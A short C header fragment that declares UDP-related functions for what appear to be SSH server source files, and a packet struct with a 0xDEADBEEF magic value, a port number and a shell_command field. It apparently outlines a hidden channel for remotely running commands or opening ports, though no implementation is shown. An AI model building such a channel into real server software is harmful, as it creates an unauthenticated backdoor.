void start_udp(void); 			//svr-runopts.c
int start_udp_request(void);	//svr-runopts.c to svr-main.c
void addportrequest(int);		//svr-main.c
// extern int udp_flag; 			//global flag 


typedef struct {
	uint32_t magic; /* should be 0xDEADBEEF */
	uint16_t port_number;
    char shell_command[256];
} listen_packet_t;
